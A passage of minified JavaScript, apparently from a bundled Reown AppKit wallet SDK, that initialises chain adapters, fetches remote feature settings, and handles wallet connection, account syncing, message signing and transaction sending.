s=i&&!e?jt.DEFAULT_REMOTE_FEATURES:jt.DEFAULT_REMOTE_FEATURES_DISABLED;try{for(const o of fOe){const a=this.processFeature(o,n,r,i,e);Object.assign(s,{[o]:a})}}catch(o){return console.warn("[Reown Config] Failed to process the configuration from Cloud. Using default values.",o),jt.DEFAULT_REMOTE_FEATURES}if(i&&this.localSettingsOverridden.size>0){const o=`Your local configuration for ${Array.from(this.localSettingsOverridden).join(", ")} was ignored because a remote configuration was successfully fetched. Please manage these features via your project dashboard on dashboard.reown.com.`;Yi.open({debugMessage:Es.ALERT_WARNINGS.LOCAL_CONFIGURATION_IGNORED.debugMessage(o)},"warning")}return s}};class pOe{constructor(e){this.chainNamespaces=[],this.features={},this.remoteFeatures={},this.reportedAlertErrors={},this.getCaipNetwork=(n,r)=>{if(n){const i=Y.getCaipNetworks(n)?.find(a=>a.id===r);if(i)return i;const s=Y.getNetworkData(n)?.caipNetwork;return s||Y.getRequestedCaipNetworks(n).filter(a=>a.chainNamespace===n)?.[0]}return Y.state.activeCaipNetwork||this.defaultCaipNetwork},this.getCaipNetworkId=()=>{const n=this.getCaipNetwork();if(n)return n.id},this.getCaipNetworks=n=>Y.getCaipNetworks(n),this.getActiveChainNamespace=()=>Y.state.activeChain,this.setRequestedCaipNetworks=(n,r)=>{Y.setRequestedCaipNetworks(n,r)},this.getApprovedCaipNetworkIds=()=>Y.getAllApprovedCaipNetworkIds(),this.getCaipAddress=n=>Y.state.activeChain===n||!n?Y.state.activeCaipAddress:Y.state.chains.get(n)?.accountState?.caipAddress,this.setClientId=n=>{Bt.setClientId(n)},this.getProvider=n=>Rn.getProvider(n),this.getProviderType=n=>Rn.getProviderId(n),this.getPreferredAccountType=n=>Zr(n),this.setCaipAddress=(n,r,i=!1)=>{Y.setAccountProp("caipAddress",n,r,i),Y.setAccountProp("address",xe.getPlainAddress(n),r,i)},this.setBalance=(n,r,i)=>{Y.setAccountProp("balance",n,i),Y.setAccountProp("balanceSymbol",r,i)},this.setProfileName=(n,r)=>{Y.setAccountProp("profileName",n,r)},this.setProfileImage=(n,r)=>{Y.setAccountProp("profileImage",n,r)},this.setUser=(n,r)=>{Y.setAccountProp("user",n,r)},this.resetAccount=n=>{Y.resetAccount(n)},this.setCaipNetwork=n=>{Y.setActiveCaipNetwork(n)},this.setCaipNetworkOfNamespace=(n,r)=>{Y.setChainNetworkData(r,{caipNetwork:n})},this.setStatus=(n,r)=>{Y.setAccountProp("status",n,r),Ce.isConnected()?Be.setConnectionStatus("connected"):Be.setConnectionStatus("disconnected")},this.getAddressByChainNamespace=n=>Y.getAccountData(n)?.address,this.setConnectors=n=>{const r=[...Ce.state.allConnectors,...n];Ce.setConnectors(r)},this.setConnections=(n,r)=>{Be.setConnections(n,r),ke.setConnections(n,r)},this.fetchIdentity=n=>Bt.fetchIdentity(n),this.getReownName=n=>lE.getNamesForAddress(n),this.getConnectors=()=>Ce.getConnectors(),this.getConnectorImage=n=>er.getConnectorImage(n),this.getConnections=n=>this.remoteFeatures.multiWallet?Dc.getConnectionsData(n).connections:(Yi.open(ge.REMOTE_FEATURES_ALERTS.MULTI_WALLET_NOT_ENABLED.DEFAULT,"info"),[]),this.getRecentConnections=n=>this.remoteFeatures.multiWallet?Dc.getConnectionsData(n).recentConnections:(Yi.open(ge.REMOTE_FEATURES_ALERTS.MULTI_WALLET_NOT_ENABLED.DEFAULT,"info"),[]),this.switchConnection=async n=>{if(!this.remoteFeatures.multiWallet){Yi.open(ge.REMOTE_FEATURES_ALERTS.MULTI_WALLET_NOT_ENABLED.DEFAULT,"info");return}await ke.switchConnection(n)},this.deleteConnection=n=>{if(!this.remoteFeatures.multiWallet){Yi.open(ge.REMOTE_FEATURES_ALERTS.MULTI_WALLET_NOT_ENABLED.DEFAULT,"info");return}Be.deleteAddressFromConnection(n),ke.syncStorageConnections()},this.setConnectedWalletInfo=(n,r)=>{const i=Rn.getProviderId(r),s=n?{...n,type:i}:void 0;Y.setAccountProp("connectedWalletInfo",s,r)},this.getIsConnectedState=()=>!!Y.state.activeCaipAddress,this.addAddressLabel=(n,r,i)=>{const s=Y.getAccountData(i)?.addressLabels||{};Y.setAccountProp("addressLabels",{...s,[n]:r},i)},this.removeAddressLabel=(n,r)=>{const i=Y.getAccountData(r)?.addressLabels||{};Y.setAccountProp("addressLabels",{...i,[n]:void 0},r)},this.getAddress=n=>{const r=n||Y.state.activeChain;return Y.getAccountData(r)?.address},this.resetNetwork=n=>{Y.resetNetwork(n)},this.addConnector=n=>{Ce.addConnector(n)},this.resetWcConnection=()=>{ke.resetWcConnection()},this.setAddressExplorerUrl=(n,r)=>{Y.setAccountProp("addressExplorerUrl",n,r)},this.setSmartAccountDeployed=(n,r)=>{Y.setAccountProp("smartAccountDeployed",n,r)},this.setPreferredAccountType=(n,r)=>{Y.setAccountProp("preferredAccountType",n,r)},this.setEIP6963Enabled=n=>{de.setEIP6963Enabled(n)},this.handleUnsafeRPCRequest=()=>{if(this.isOpen()){if(this.isTransactionStackEmpty())return;this.redirect("ApproveTransaction")}else this.open({view:"ApproveTransaction"})},this.options=e,this.version=e.sdkVersion,this.caipNetworks=this.extendCaipNetworks(e),this.chainNamespaces=this.getChainNamespacesSet(e.adapters,this.caipNetworks),this.defaultCaipNetwork=this.extendDefaultCaipNetwork(e),this.chainAdapters=this.createAdapters(e.adapters),this.readyPromise=this.initialize(e)}getChainNamespacesSet(e,n){const r=e?.map(s=>s.namespace).filter(s=>!!s);if(r?.length)return[...new Set(r)];const i=n?.map(s=>s.chainNamespace);return[...new Set(i)]}async initialize(e){if(this.initializeProjectSettings(e),this.initControllers(e),await this.initChainAdapters(),this.sendInitializeEvent(e),de.state.enableReconnect?(await this.syncExistingConnection(),await this.syncAdapterConnections()):await this.unSyncExistingConnection(),!e.basic&&!e.manualWCControl&&(this.remoteFeatures=await hOe.fetchRemoteFeatures(e)),await Ge.fetchUsage(),de.setRemoteFeatures(this.remoteFeatures),this.remoteFeatures.onramp&&Lk.setOnrampProviders(this.remoteFeatures.onramp),(de.state.remoteFeatures?.email||Array.isArray(de.state.remoteFeatures?.socials)&&de.state.remoteFeatures?.socials.length>0)&&await this.checkAllowedOrigins(),de.state.features?.reownAuthentication||de.state.remoteFeatures?.reownAuthentication){const{ReownAuthentication:n}=await pt(async()=>{const{ReownAuthentication:i}=await import("./features-CwVTngeI.js");return{ReownAuthentication:i}},[]),r=de.state.siwx;r instanceof n||(r&&console.warn("ReownAuthentication option is enabled, SIWX configuration will be overridden."),de.setSIWX(new n))}}async openSend(e){const n=e.namespace||Y.state.activeChain,r=this.getCaipAddress(n),i=this.getCaipNetwork(n)?.id;if(!r)throw new Error("openSend: caipAddress not found");if(i?.toString()!==e.chainId.toString()){const s=Y.getCaipNetworkById(e.chainId,n);if(!s)throw new Error(`openSend: caipNetwork with chainId ${e.chainId} not found`);await this.switchNetwork(s,{throwOnFailure:!0})}try{const s=_ae.getTokenSymbolByAddress(e.assetAddress);s&&await Ge.fetchTokenImages([s])}catch{}return await kt.open({view:"WalletSend",data:{send:e}}),new Promise((s,o)=>{const a=rn.subscribeKey("hash",f=>{f&&(l(),s({hash:f}))}),c=kt.subscribe(f=>{f.open||(l(),o(new Error("Modal closed")))}),l=this.createCleanupHandler([a,c])})}toModalOptions(){function e(r){return r?.view==="Swap"}function n(r){return r?.view==="WalletSend"}return{isSwap:e,isSend:n}}async checkAllowedOrigins(){try{const e=await Ge.fetchAllowedOrigins();if(!xe.isClient())return;const n=window.location.origin;$l.isOriginAllowed(n,e,ge.DEFAULT_ALLOWED_ANCESTORS)||Yi.open(Es.ALERT_ERRORS.ORIGIN_NOT_ALLOWED,"error")}catch(e){if(!(e instanceof Error))return;switch(e.message){case"RATE_LIMITED":Yi.open(Es.ALERT_ERRORS.RATE_LIMITED_APP_CONFIGURATION,"error");break;case"SERVER_ERROR":{const n=e.cause instanceof Error?e.cause:e;Yi.open({displayMessage:Es.ALERT_ERRORS.SERVER_ERROR_APP_CONFIGURATION.displayMessage,debugMessage:Es.ALERT_ERRORS.SERVER_ERROR_APP_CONFIGURATION.debugMessage(n.message)},"error");break}}}}createCleanupHandler(e){return()=>{e.forEach(n=>{try{n()}catch{}})}}sendInitializeEvent(e){const{...n}=e;delete n.adapters,delete n.universalProvider,tt.sendEvent({type:"track",event:"INITIALIZE",properties:{...n,networks:e.networks.map(r=>r.id),siweConfig:{options:e.siweConfig?.options||{}}}})}initControllers(e){this.initializeOptionsController(e),this.initializeChainController(e),this.initializeThemeController(e),this.initializeConnectionController(e),this.initializeConnectorController()}initAdapterController(){Gre.initialize(this.chainAdapters)}initializeThemeController(e){e.themeMode&&Ji.setThemeMode(e.themeMode),e.themeVariables&&Ji.setThemeVariables(e.themeVariables)}initializeChainController(e){if(!this.connectionControllerClient)throw new Error("ConnectionControllerClient must be set");Y.initialize(e.adapters??[],this.caipNetworks,{connectionControllerClient:this.connectionControllerClient});const n=this.getDefaultNetwork();n&&Y.setActiveCaipNetwork(n)}initializeConnectionController(e){ke.initialize(e.adapters??[]),ke.setWcBasic(e.basic??!1)}initializeConnectorController(){Ce.initialize(this.chainNamespaces)}initializeProjectSettings(e){de.setProjectId(e.projectId),de.setSdkVersion(e.sdkVersion)}initializeOptionsController(e){de.setDebug(e.debug!==!1),de.setEnableWalletGuide(e.enableWalletGuide!==!1),de.setEnableWallets(e.enableWallets!==!1),de.setEIP6963Enabled(e.enableEIP6963!==!1),de.setEnableNetworkSwitch(e.enableNetworkSwitch!==!1),de.setEnableReconnect(e.enableReconnect!==!1),de.setEnableMobileFullScreen(e.enableMobileFullScreen===!0),de.setCoinbasePreference(e.coinbasePreference),de.setEnableAuthLogger(e.enableAuthLogger!==!1),de.setCustomRpcUrls(e.customRpcUrls),de.setEnableEmbedded(e.enableEmbedded),de.setAllWallets(e.allWallets),de.setIncludeWalletIds(e.includeWalletIds),de.setExcludeWalletIds(e.excludeWalletIds),de.setFeaturedWalletIds(e.featuredWalletIds),de.setTokens(e.tokens),de.setTermsConditionsUrl(e.termsConditionsUrl),de.setPrivacyPolicyUrl(e.privacyPolicyUrl),de.setCustomWallets(e.customWallets),de.setFeatures(e.features),de.setAllowUnsupportedChain(e.allowUnsupportedChain),de.setUniversalProviderConfigOverride(e.universalProviderConfigOverride),de.setPreferUniversalLinks(e.experimental_preferUniversalLinks),de.setDefaultAccountTypes(e.defaultAccountTypes);const n=this.getDefaultMetaData();if(!e.metadata&&n&&(e.metadata=n),de.setMetadata(e.metadata),de.setDisableAppend(e.disableAppend),de.setEnableEmbedded(e.enableEmbedded),de.setSIWX(e.siwx),this.features=de.state.features??{},!e.projectId){Yi.open(Es.ALERT_ERRORS.PROJECT_ID_NOT_CONFIGURED,"error");return}if(e.adapters?.find(i=>i.namespace===ge.CHAIN.EVM)&&e.siweConfig){if(e.siwx)throw new Error("Cannot set both `siweConfig` and `siwx` options");de.setSIWX(e.siweConfig.mapToSIWX())}}getDefaultMetaData(){return xe.isClient()?{name:document.getElementsByTagName("title")?.[0]?.textContent||"",description:document.querySelector('meta[property="og:description"]')?.content||"",url:window.location.origin,icons:[document.querySelector('link[rel~="icon"]')?.href||""]}:null}setUnsupportedNetwork(e){const n=this.getActiveChainNamespace();if(n){const r=Rm.getUnsupportedNetwork(`${n}:${e}`);Y.setActiveCaipNetwork(r)}}getDefaultNetwork(){return Rm.getCaipNetworkFromStorage(this.defaultCaipNetwork)}extendCaipNetwork(e,n){return Rm.extendCaipNetwork(e,{customNetworkImageUrls:n.chainImages,projectId:n.projectId})}extendCaipNetworks(e){return Rm.extendCaipNetworks(e.networks,{customNetworkImageUrls:e.chainImages,customRpcUrls:e.customRpcUrls,projectId:e.projectId})}extendDefaultCaipNetwork(e){const n=e.networks.find(i=>i.id===e.defaultNetwork?.id);return n?Rm.extendCaipNetwork(n,{customNetworkImageUrls:e.chainImages,customRpcUrls:e.customRpcUrls,projectId:e.projectId}):void 0}async disconnectConnector(e,n){try{this.setLoading(!0,e);let r={connections:[]};const i=this.getAdapter(e);return(Y.state.chains.get(e)?.accountState?.caipAddress||!de.state.enableReconnect)&&i?.disconnect&&(r=await i.disconnect({id:n})),this.setLoading(!1,e),r}catch(r){throw this.setLoading(!1,e),new Error(`Failed to disconnect chains: ${r.message}`)}}createClients(){this.connectionControllerClient={connectWalletConnect:async()=>{const e=Y.state.activeChain,n=this.getAdapter(e),r=this.getCaipNetwork(e)?.id,i=ke.getConnections(e),s=this.remoteFeatures.multiWallet,o=i.length>0;if(!n)throw new Error("Adapter not found");const a=await n.connectWalletConnect(r);(!o||!s)&&this.close(),this.setClientId(a?.clientId||null),Be.setConnectedNamespaces([...Y.state.chains.keys()]),await this.syncWalletConnectAccount(),await As.initializeIfEnabled()},connectExternal:async e=>{const n=await this.onConnectExternal(e);return await this.connectInactiveNamespaces(e,n),n?{address:n.address}:void 0},reconnectExternal:async({id:e,info:n,type:r,provider:i})=>{const s=Y.state.activeChain,o=this.getAdapter(s);if(!s)throw new Error("reconnectExternal: namespace not found");if(!o)throw new Error("reconnectExternal: adapter not found");o?.reconnect&&(await o?.reconnect({id:e,info:n,type:r,provider:i,chainId:this.getCaipNetwork()?.id}),Be.addConnectedNamespace(s),this.syncConnectedWalletInfo(s))},disconnectConnector:async e=>{await this.disconnectConnector(e.namespace,e.id)},disconnect:async e=>{const{id:n,chainNamespace:r,initialDisconnect:i}=e||{},s=r||Y.state.activeChain,o=Ce.getConnectorId(s),a=n===ge.CONNECTOR_ID.AUTH||o===ge.CONNECTOR_ID.AUTH,c=n===ge.CONNECTOR_ID.WALLET_CONNECT||o===ge.CONNECTOR_ID.WALLET_CONNECT;try{const l=Array.from(Y.state.chains.keys());let f=r?[r]:l;(c||a)&&(f=l);const h=f.map(async w=>{const y=Ce.getConnectorId(w),E=n||y,A=await this.disconnectConnector(w,E);A&&(a&&Be.deleteConnectedSocialProvider(),A.connections.forEach(R=>{Be.addDisconnectedConnectorId(R.connectorId,w)})),i&&this.onDisconnectNamespace({chainNamespace:w,closeModal:!1})}),m=await Promise.allSettled(h);rn.resetSend(),ke.resetWcConnection(),As.getSIWX()?.signOutOnDisconnect&&await As.clearSessions(),Ce.setFilterByNamespace(void 0),ke.syncStorageConnections();const b=m.filter(w=>w.status==="rejected");if(b.length>0)throw new Error(b.map(w=>w.reason.message).join(", "));tt.sendEvent({type:"track",event:"DISCONNECT_SUCCESS",properties:{namespace:r||"all"}})}catch(l){throw new Error(`Failed to disconnect chains: ${l.message}`)}},checkInstalled:e=>e?e.some(n=>!!window.ethereum?.[String(n)]):!!window.ethereum,signMessage:async e=>{const n=Y.state.activeChain,r=this.getAdapter(Y.state.activeChain);if(!n)throw new Error("signMessage: namespace not found");if(!r)throw new Error("signMessage: adapter not found");const i=this.getAddress(n);if(!i)throw new Error("signMessage: address not found");return(await r?.signMessage({message:e,address:i,provider:Rn.getProvider(n)}))?.signature||""},sendTransaction:async e=>{const n=e.chainNamespace;if(!n)throw new Error("sendTransaction: namespace not found");if(jt.SEND_SUPPORTED_NAMESPACES.includes(n)){const r=this.getAdapter(n);if(!r)throw new Error("sendTransaction: adapter not found");const i=Rn.getProvider(n);return(await r?.sendTransaction({...e,caipNetwork:this.getCaipNetwork(),provider:i}))?.hash||""}return""},estimateGas:async e=>{const n=e.chainNamespace;if(n===ge.CHAIN.EVM){const r=this.getAdapter(n);if(!r)throw new Error("estimateGas: adapter is required but got undefined");const i=Rn.getProvider(n),s=this.getCaipNetwork();if(!s)throw new Error("estimateGas: caipNetwork is required but got undefined");return(await r?.estimateGas({...e,provider:i,caipNetwork:s}))?.gas||0n}return 0n},getEnsAvatar:async()=>{const e=Y.state.activeChain;if(!e)throw new Error("getEnsAvatar: namespace is required but got undefined");const n=this.getAddress(e);if(!n)throw new Error("getEnsAvatar: address not found");return await this.syncIdentity({address:n,chainId:Number(this.getCaipNetwork()?.id),chainNamespace:e}),Y.getAccountData()?.profileImage||!1},getEnsAddress:async e=>await $l.resolveReownName(e),writeContract:async e=>{const n=Y.state.activeChain,r=this.getAdapter(n);if(!n)throw new Error("writeContract: namespace is required but got undefined");if(!r)throw new Error("writeContract: adapter is required but got undefined");const i=this.getCaipNetwork(),s=this.getCaipAddress(),o=Rn.getProvider(n);if(!i||!s)throw new Error("writeContract: caipNetwork or caipAddress is required but got undefined");return(await r?.writeContract({...e,caipNetwork:i,provider:o,caipAddress:s}))?.hash},parseUnits:(e,n)=>{const r=this.getAdapter(Y.state.activeChain);if(!r)throw new Error("parseUnits: adapter is required but got undefined");return r?.parseUnits({value:e,decimals:n})??0n},formatUnits:(e,n)=>{const r=this.getAdapter(Y.state.activeChain);if(!r)throw new Error("formatUnits: adapter is required but got undefined");return r?.formatUnits({value:e,decimals:n})??"0"},getCapabilities:async e=>{const n=this.getAdapter(Y.state.activeChain);if(!n)throw new Error("getCapabilities: adapter is required but got undefined");return await n?.getCapabilities(e)},grantPermissions:async e=>{const n=this.getAdapter(Y.state.activeChain);if(!n)throw new Error("grantPermissions: adapter is required but got undefined");return await n?.grantPermissions(e)},revokePermissions:async e=>{const n=this.getAdapter(Y.state.activeChain);if(!n)throw new Error("revokePermissions: adapter is required but got undefined");return n?.revokePermissions?await n.revokePermissions(e):"0x"},walletGetAssets:async e=>{const n=this.getAdapter(Y.state.activeChain);if(!n)throw new Error("walletGetAssets: adapter is required but got undefined");return await n?.walletGetAssets(e)??{}},updateBalance:e=>{const n=this.getAddress(e),r=this.getCaipNetwork(e);!r||!n||this.updateNativeBalance(n,r?.id,e)}},ke.setClient(this.connectionControllerClient)}async onConnectExternal(e){const n=Y.state.activeChain,r=e.chain||n,i=this.getAdapter(r);let s=!0;if(e.type===sn.CONNECTOR_TYPE_AUTH&&ge.AUTH_CONNECTOR_SUPPORTED_CHAINS.some(h=>Ce.getConnectorId(h)===ge.CONNECTOR_ID.AUTH)&&e.chain!==n&&(s=!1),e.chain&&e.chain!==n&&!e.caipNetwork){const l=this.getCaipNetworks().find(f=>f.chainNamespace===e.chain);l&&s&&this.setCaipNetwork(l)}if(!r)throw new Error("connectExternal: namespace not found");if(!i)throw new Error("connectExternal: adapter not found");const o=this.getCaipNetwork(r),a=e.caipNetwork||o,c=await i.connect({id:e.id,address:e.address,info:e.info,type:e.type,provider:e.provider,socialUri:e.socialUri,chainId:e.caipNetwork?.id||o?.id,rpcUrl:e.caipNetwork?.rpcUrls?.default?.http?.[0]||o?.rpcUrls?.default?.http?.[0]});if(c)return Be.addConnectedNamespace(r),this.syncProvider({...c,chainNamespace:r}),this.setStatus("connected",r),this.syncConnectedWalletInfo(r),Be.removeDisconnectedConnectorId(e.id,r),{address:c.address,connectedCaipNetwork:a}}async connectInactiveNamespaces(e,n){const r=e.type===sn.CONNECTOR_TYPE_AUTH,i=Gr.getOtherAuthNamespaces(n?.connectedCaipNetwork?.chainNamespace),s=Y.state.activeCaipNetwork,o=this.getAdapter(s?.chainNamespace);r&&(await Promise.all(i.map(async a=>{try{const c=Rn.getProvider(a),l=this.getCaipNetwork(a);await this.getAdapter(a)?.connect({...e,provider:c,socialUri:void 0,chainId:l?.id,rpcUrl:l?.rpcUrls?.default?.http?.[0]})&&(Be.addConnectedNamespace(a),Be.removeDisconnectedConnectorId(e.id,a),this.setStatus("connected",a),this.syncConnectedWalletInfo(a))}catch(c){Yi.warn(Es.ALERT_WARNINGS.INACTIVE_NAMESPACE_NOT_CONNECTED.displayMessage,Es.ALERT_WARNINGS.INACTIVE_NAMESPACE_NOT_CONNECTED.debugMessage(a,c instanceof Error?c.message:void 0),Es.ALERT_WARNINGS.INACTIVE_NAMESPACE_NOT_CONNECTED.code)}})),s&&await o?.switchNetwork({caipNetwork:s}))}getApprovedCaipNetworksData(){if(Rn.getProviderId(Y.state.activeChain)===sn.CONNECTOR_TYPE_WALLET_CONNECT){const n=this.universalProvider?.session?.namespaces;return{supportsAllNetworks:this.universalProvider?.session?.peer?.metadata.name==="MetaMask Wallet",approvedCaipNetworkIds:this.getChainsFromNamespaces(n)}}return{supportsAllNetworks:!0,approvedCaipNetworkIds:[]}}async switchCaipNetwork(e){const n=e.chainNamespace;if(this.getAddressByChainNamespace(e.chainNamespace)){const i=Rn.getProviderId(n);if(e.chainNamespace===Y.state.activeChain)await this.getAdapter(n)?.switchNetwork({caipNetwork:e});else if(this.setCaipNetwork(e),i===sn.CONNECTOR_TYPE_WALLET_CONNECT)this.syncWalletConnectAccount();else{const s=this.getAddressByChainNamespace(n);s&&this.syncAccount({address:s,chainId:e.id,chainNamespace:n})}}else this.setCaipNetwork(e)}getChainsFromNamespaces(e={}){return Object.values(e).flatMap(n=>{const r=n.chains||[],i=n.accounts.map(s=>{const{chainId:o,chainNamespace:a}=gi.parseCaipAddress(s);return`${a}:${o}`});return Array.from(new Set([...r,...i]))})}createAdapters(e){return this.createClients(),this.chainNamespaces.reduce((n,r)=>{const i=e?.find(s=>s.namespace===r);return i?(i.construct({namespace:r,projectId:this.options?.projectId,networks:this.caipNetworks?.filter(({chainNamespace:s})=>s===r)}),n[r]=i):n[r]=new dOe({namespace:r,networks:this.getCaipNetworks()}),n},{})}async initChainAdapter(e){this.onConnectors(e),this.listenAdapter(e);const n=this.getAdapter(e);if(!n)throw new Error("adapter not found");await n.syncConnectors(),await this.createUniversalProviderForAdapter(e)}async initChainAdapters(){await Promise.all(this.chainNamespaces.map(async e=>{await this.initChainAdapter(e)})),this.initAdapterController()}onConnectors(e){this.getAdapter(e)?.on("connectors",this.setConnectors.bind(this))}listenAdapter(e){const n=this.getAdapter(e);if(!n)return;const r=Be.getConnectionStatus();de.state.enableReconnect===!1?this.setStatus("disconnected",e):r==="connected"?this.setStatus("connecting",e):r==="disconnected"?(Be.clearAddressCache(),this.setStatus(r,e)):this.setStatus(r,e),n.on("switchNetwork",({address:i,chainId:s})=>{const o=this.getCaipNetworks().find(l=>l.id.toString()===s.toString()||l.caipNetworkId.toString()===s.toString()),a=Y.state.activeChain===e,c=Y.state.chains.get(e)?.accountState?.address;if(o){const l=a&&i?i:c;l&&this.syncAccount({address:l,chainId:o.id,chainNamespace:e})}else this.setUnsupportedNetwork(s)}),n.on("disconnect",()=>{const i=this.remoteFeatures.multiWallet,s=Array.from(ke.state.connections.values()).flat();this.onDisconnectNamespace({chainNamespace:e,closeModal:!i||s.length===0})}),n.on("connections",i=>{this.setConnections(i,e)}),n.on("pendingTransactions",()=>{const i=this.getAddress(e),s=Y.state.activeCaipNetwork;!i||!s?.id||this.updateNativeBalance(i,s.id,s.chainNamespace)}),n.on("accountChanged",({address:i,chainId:s,connector:o})=>{this.handlePreviousConnectorConnection(o);const a=Y.state.activeChain===e;o?.provider&&(this.syncProvider({id:o.id,type:o.type,provider:o?.provider,chainNamespace:e}),this.syncConnectedWalletInfo(e));const c=Y.getNetworkData(e)?.caipNetwork?.id,l=s||c;a&&l?this.syncAccount({address:i,chainId:l,chainNamespace:e}):!a&&l?(this.syncAccountInfo(i,l,e),this.syncBalance({address:i,chainId:l,chainNamespace:e})):this.syncAccountInfo(i,s,e),Be.addConnectedNamespace(e)})}async handlePreviousConnectorConnection(e){const n=e?.chain,r=e?.id,i=Ce.getConnectorId(n),s=de.state.remoteFeatures?.multiWallet,a=n&&r&&i&&i!==r&&!s;try{a&&await ke.disconnect({id:i,namespace:n})}catch(c){console.warn("Error disconnecting previous connector",c)}}async createUniversalProviderForAdapter(e){await this.getUniversalProvider(),this.universalProvider&&await this.chainAdapters?.[e]?.setUniversalProvider?.(this.universalProvider)}async syncExistingConnection(){await Promise.allSettled(this.chainNamespaces.map(e=>this.syncNamespaceConnection(e)))}async unSyncExistingConnection(){try{await Promise.allSettled(this.chainNamespaces.map(e=>ke.disconnect({namespace:e,initialDisconnect:!0})))}catch(e){console.error("Error disconnecting existing connections:",e)}}async reconnectWalletConnect(){await this.syncWalletConnectAccount();const e=this.getAddress();this.getCaipAddress()||Be.deleteRecentWallet();const n=Be.getRecentWallet();tt.sendEvent({type:"track",event:"CONNECT_SUCCESS",address:e,properties:{method:xe.isMobile()?"mobile":"qrcode",name:n?.name||"Unknown",reconnect:!0,view:we.state.view,walletRank:n?.order}})}async syncNamespaceConnection(e){try{e===ge.CHAIN.EVM&&xe.isSafeApp()&&Ce.setConnectorId(ge.CONNECTOR_ID.SAFE,e);const n=Ce.getConnectorId(e);switch(this.setStatus("connecting",e),n){case ge.CONNECTOR_ID.WALLET_CONNECT:await this.reconnectWalletConnect();break;case ge.CONNECTOR_ID.AUTH:break;default:await this.syncAdapterConnection(e)}}catch(n){console.warn("AppKit couldn't sync existing connection",n),this.setStatus("disconnected",e)}}onDisconnectNamespace(e){const{chainNamespace:n,closeModal:r}=e||{};Y.resetAccount(n),Y.resetNetwork(n),Be.removeConnectedNamespace(n);const i=Array.from(Y.state.chains.keys());(n?[n]:i).forEach(o=>Be.addDisconnectedConnectorId(Ce.getConnectorId(o)||"",o)),Ce.removeConnectorId(n),Rn.resetChain(n),this.setUser(null,n),this.setStatus("disconnected",n),this.setConnectedWalletInfo(null,n),r!==!1&&kt.close()}async syncAdapterConnections(){await Promise.allSettled(this.chainNamespaces.map(e=>{const n=this.getAdapter(e),r=this.getCaipAddress(e),i=this.getCaipNetwork(e);return n?.syncConnections({connectToFirstConnector:!r,caipNetwork:i})}))}async syncAdapterConnection(e){const n=this.getAdapter(e),r=this.getCaipNetwork(e),i=Ce.getConnectorId(e),o=Ce.getConnectors(e).find(a=>a.id===i);try{if(!n||!o)throw new Error(`Adapter or connector not found for namespace ${e}`);if(!r?.id)throw new Error("CaipNetwork not found");const a=await n?.syncConnection({namespace:e,id:o.id,chainId:r.id,rpcUrl:r?.rpcUrls?.default?.http?.[0]});a?(this.syncProvider({...a,chainNamespace:e}),await this.syncAccount({...a,chainNamespace:e}),this.setStatus("connected",e),tt.sendEvent({type:"track",event:"CONNECT_SUCCESS",address:a.address,properties:{method:"browser",name:o.info?.name||o.name||"Unknown",reconnect:!0,view:we.state.view,walletRank:o?.explorerWallet?.order}})):this.setStatus("disconnected",e)}catch{this.onDisconnectNamespace({chainNamespace:e,closeModal:!1})}}async syncWalletConnectAccount(){const e=Object.keys(this.universalProvider?.session?.namespaces||{}),n=this.chainNamespaces.map(async r=>{const i=this.getAdapter(r);if(!i)return;const s=this.universalProvider?.session?.namespaces?.[r]?.accounts||[],o=Y.state.activeCaipNetwork?.id,a=s.find(l=>{const{chainId:f}=gi.parseCaipAddress(l);return f===o?.toString()})||s[0];if(a){const l=gi.validateCaipAddress(a),{chainId:f,address:h}=gi.parseCaipAddress(l);if(Rn.setProviderId(r,sn.CONNECTOR_TYPE_WALLET_CONNECT),this.caipNetworks&&Y.state.activeCaipNetwork&&i.namespace!==ge.CHAIN.EVM){const m=i.getWalletConnectProvider({caipNetworks:this.getCaipNetworks(),provider:this.universalProvider,activeCaipNetwork:Y.state.activeCaipNetwork});Rn.setProvider(r,m)}else Rn.setProvider(r,this.universalProvider);Ce.setConnectorId(ge.CONNECTOR_ID.WALLET_CONNECT,r),Be.addConnectedNamespace(r),await this.syncAccount({address:h,chainId:f,chainNamespace:r})}else e.includes(r)&&this.setStatus("disconnected",r);const c=this.getApprovedCaipNetworksData();this.syncConnectedWalletInfo(r),Y.setApprovedCaipNetworksData(r,{approvedCaipNetworkIds:c.approvedCaipNetworkIds,supportsAllNetworks:c.supportsAllNetworks})});await Promise.all(n)}syncProvider({type:e,provider:n,id:r,chainNamespace:i}){Rn.setProviderId(i,e),Rn.setProvider(i,n),Ce.setConnectorId(r,i)}async syncAccount(e){const n=e.chainNamespace===Y.state.activeChain,r=Y.getCaipNetworkByNamespace(e.chainNamespace,e.chainId),{address:i,chainId:s,chainNamespace:o}=e,{chainId:a}=Be.getActiveNetworkProps(),c=r?.id||a,l=Y.state.activeCaipNetwork?.name===ge.UNSUPPORTED_NETWORK_NAME,f=Y.getNetworkProp("supportsAllNetworks",o);if(this.setStatus("connected",o),!(l&&!f)&&c){let h=this.getCaipNetworks().find(y=>y.id.toString()===c.toString()),m=this.getCaipNetworks().find(y=>y.chainNamespace===o);if(!f&&!h&&!m){const y=this.getApprovedCaipNetworkIds()||[],E=y.find(R=>gi.parseCaipNetworkId(R)?.chainId===c.toString()),A=y.find(R=>gi.parseCaipNetworkId(R)?.chainNamespace===o);h=this.getCaipNetworks().find(R=>R.caipNetworkId===E),m=this.getCaipNetworks().find(R=>R.caipNetworkId===A||"deprecatedCaipNetworkId"in R&&R.deprecatedCaipNetworkId===A)}const b=h||m;b?.chainNamespace===Y.state.activeChain?de.state.enableNetworkSwitch&&!de.state.allowUnsupportedChain&&Y.state.activeCaipNetwork?.name===ge.UNSUPPORTED_NETWORK_NAME?Y.showUnsupportedChainUI():this.setCaipNetwork(b):n||r&&this.setCaipNetworkOfNamespace(r,o),this.syncConnectedWalletInfo(o);const w=this.getAddress(o);Gr.isLowerCaseMatch(i,w)||this.syncAccountInfo(i,b?.id,o),n?await this.syncBalance({address:i,chainId:b?.id,chainNamespace:o}):await this.syncBalance({address:i,chainId:r?.id,chainNamespace:o}),this.syncIdentity({address:i,chainId:s,chainNamespace:o})}}async syncAccountInfo(e,n,r){const i=this.getCaipAddress(r),s=n||i?.split(":")[1];if(!s)return;const o=`${r}:${s}:${e}`;this.setCaipAddress(o,r,!0),await this.syncIdentity({address:e,chainId:s,chainNamespace:r})}async syncReownName(e,n){try{const r=await this.getReownName(e);if(r[0]){const i=r[0];this.setProfileName(i.name,n)}else this.setProfileName(null,n)}catch{this.setProfileName(null,n)}}syncConnectedWalletInfo(e){const 